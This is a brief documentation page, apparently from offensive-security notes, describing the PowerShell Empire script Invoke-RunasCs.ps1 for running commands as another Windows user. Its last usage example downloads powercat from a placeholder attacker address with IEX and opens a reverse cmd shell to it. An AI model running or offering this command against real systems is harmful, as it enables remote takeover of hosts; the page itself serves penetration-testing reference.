Management files
***********************

Location
#############

*/usr/share/powershell-empire/empire/server/data/module_source/management*

Files
#########

Invoke-RunasCs.ps1
+++++++++++++++++++++++

What it does
---------------------
It acts like a wrapper around the Windows *runas* command allowing users to run commands or programs as a different user, typically with elevated privileges

How to run it
---------------

.. code-block:: console

    Import-Module ./Invoke-RunasCs.ps1
    Invoke-RunasCs -Username <user> -Password <password> -Command "whoami"
    Invoke-RunasCs -Username <user> -Password <password> -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://Attacker.IP.Address/powercat.ps1');powercat -c Attacker.IP.Address -p <listening port> -e cmd"


